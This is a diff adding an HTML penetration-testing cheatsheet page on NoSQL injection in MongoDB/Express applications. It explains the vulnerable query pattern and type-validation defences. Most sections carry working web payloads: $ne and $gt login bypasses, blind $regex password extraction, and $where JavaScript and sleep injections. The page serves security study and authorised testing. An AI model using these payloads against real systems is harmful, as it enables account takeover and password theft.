@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NoSQL Injection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>NoSQL Injection</h1><p class="cx-lede">Operator and JavaScript injection in MongoDB-backed applications.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190</span><span class="cx-tag">D3FEND D3-MH, D3-MA</span><span class="cx-tag">IMPACT AuthBypass, DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><div class="cx-aside cx-note">
+<p class="cx-aside-title">Note</p>
+<p>This page is a known stub. It will be expanded with detailed payloads and case studies as this cluster is expanded.</p>
+</div>
+<p>NoSQL databases (MongoDB most commonly) are not immune to injection. Two classes:</p>
+<ol>
+<li><strong>Operator injection</strong> - submit MongoDB query operators (<code>$ne</code>, <code>$gt</code>, <code>$regex</code>) instead of literal values.</li>
+<li><strong>JavaScript injection</strong> - abuse <code>$where</code> and <code>mapReduce</code> clauses that execute server-side JS.</li>
+</ol>
+<h2 id="tldr">TL;DR</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">JSON body</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">// Auth bypass via operator injection
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$ne&quot;: null}}
+{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null}}
+
+// Regex extraction
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}
+
+// JavaScript injection ($where)
+{&quot;$where&quot;: &quot;this.password.length &gt; 20&quot;}
+{&quot;$where&quot;: &quot;sleep(5000)&quot;}</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">URL parameters</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Express + qs library bracket notation
+?username=admin&amp;password[$ne]=null
+?username[$ne]=&amp;password[$ne]=
+?id[$gt]=0</code></pre></figure>
+</div>
+</div>
+<h2 id="when-youre-looking-at-nosql">When you're looking at NoSQL</h2>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>API accepts JSON bodies</td>
+</tr>
+<tr>
+<td>Backend is Node.js / Express / Mongoose / Meteor</td>
+</tr>
+<tr>
+<td>Errors mention <code>MongoError</code>, <code>BSON</code>, <code>$where</code></td>
+</tr>
+<tr>
+<td>URL parameters with bracket notation work: <code>?id[$gt]=0</code></td>
+</tr>
+<tr>
+<td>27017 open on internal network scan</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>If a login form returns identical errors for "wrong password" and "user not found", it's often Mongo with weak input handling.</p>
+</div>
+<h2 id="operator-injection">Operator injection</h2>
+<p>MongoDB operators are JSON keys starting with <code>$</code>. When an Express app passes <code>req.body</code> straight into a query:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">db.users.findOne({ username: req.body.username, password: req.body.password })</code></pre></figure>
+<p>A normal request:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;letmein&quot;}</code></pre></figure>
+<p>The exploit:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$ne&quot;: null}}</code></pre></figure>
+<p>Mongo evaluates <code>password: {$ne: null}</code> as "password is not null" - true for any user. Result: logged in as <code>admin</code> without knowing the password.</p>
+<h3 id="useful-operators">Useful operators</h3>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Meaning</th>
+<th>Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$ne</code></td>
+<td>Not equal</td>
+<td>Bypass exact-match checks</td>
+</tr>
+<tr>
+<td><code>$gt</code>, <code>$lt</code></td>
+<td>Greater/less than</td>
+<td>Bypass numeric checks</td>
+</tr>
+<tr>
+<td><code>$regex</code></td>
+<td>Regex match</td>
+<td>Extract data char-by-char</td>
+</tr>
+<tr>
+<td><code>$in</code></td>
+<td>In array</td>
+<td>Match any of multiple values</td>
+</tr>
+<tr>
+<td><code>$exists</code></td>
+<td>Field exists</td>
+<td>Probe schema</td>
+</tr>
+<tr>
+<td><code>$where</code></td>
+<td>Run JS</td>
+<td>Arbitrary code execution</td>
+</tr>
+</tbody>
+</table>
+<h3 id="url-encoded-operator-injection">URL-encoded operator injection</h3>
+<p>Express with the <code>qs</code> query-string parser converts bracket notation into nested objects:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET /search?username=admin&amp;password[$ne]=foo</code></pre></figure>
+<p>becomes:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">req.query = { username: &quot;admin&quot;, password: { $ne: &quot;foo&quot; } }</code></pre></figure>
+<p>If the app passes <code>req.query</code> to Mongo, this is operator injection without ever sending JSON. Test by changing any equality to bracket syntax:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?id=1               →  ?id[$ne]=0
+?username=admin     →  ?username[$ne]=</code></pre></figure>
+<h2 id="regex-extraction-blind-nosql">Regex extraction (blind NoSQL)</h2>
+<p>When you can't see output but can detect login success:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^b&quot;}}
+...
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^l&quot;}}   // ← login succeeds
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^le&quot;}}  // ← still succeeds
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;^let&quot;}}</code></pre></figure>
+<p>Each successful login confirms one more character. Like boolean blind SQLi, but the oracle is a regex prefix match.</p>
+<p>Anchor with <code>^</code> for the start and <code>$</code> for the end. Use <code>.{N}</code> to test specific lengths.</p>
+<h2 id="javascript-injection-where">JavaScript injection ($where)</h2>
+<p><code>$where</code> clauses evaluate JavaScript on the server:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;$where&quot;: &quot;this.username == &#x27;admin&#x27; &amp;&amp; this.password.length &gt; 20&quot;}</code></pre></figure>
+<p>Conditions evaluate against each document. If the app builds the <code>$where</code> string from input:</p>
+<figure class="cx-code"><figcaption>javascript</figcaption><pre><code class="language-javascript">db.users.find({$where: `this.username == &#x27;${req.body.username}&#x27;`})</code></pre></figure>
+<p>Inject:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>admin&#x27; || sleep(5000) || &#x27;
+admin&#x27; || this.password.match(/^a/) || &#x27;</code></pre></figure>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p><code>$where</code> is deprecated and often disabled. When it's enabled, RCE is possible via the JS context (which historically could touch Node globals - depends on Mongo version).</p>
+</div>
+<h2 id="detection-probes">Detection probes</h2>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null}}
+{&quot;username&quot;: {&quot;$gt&quot;: &quot;&quot;}, &quot;password&quot;: {&quot;$gt&quot;: &quot;&quot;}}
+{&quot;$where&quot;: &quot;1==1&quot;}
+{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: {&quot;$regex&quot;: &quot;.*&quot;}}</code></pre></figure>
+<p>If any returns success when normal credentials don't, it's NoSQL injection.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><code>NoSQLMap</code> - automated detection and exploitation of MongoDB injection.</li>
+<li><code>nosqli</code> (https://github.com/Charlie-belmer/nosqli) - modern NoSQL injection scanner.</li>
+<li>Burp Suite + manual payloads - most flexible for unusual cases.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>"Parameterised queries" is the SQL fix; for NoSQL, the equivalent is <strong>type validation</strong>: reject non-string values for fields that should be strings. Mongoose schema definitions enforce this when used.</li>
+<li>This page covers MongoDB. CouchDB, Cassandra, Redis, and others have their own injection patterns - generally less common.</li>
+<li>Operator injection requires that the backend deserialises user input into nested objects before the query. Apps that explicitly cast inputs to strings are not vulnerable.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../second-order/index.html">Previous: Second-order SQLi</a><a class="cx-next" href="../file-operations/index.html">Next: SQLi File Operations</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
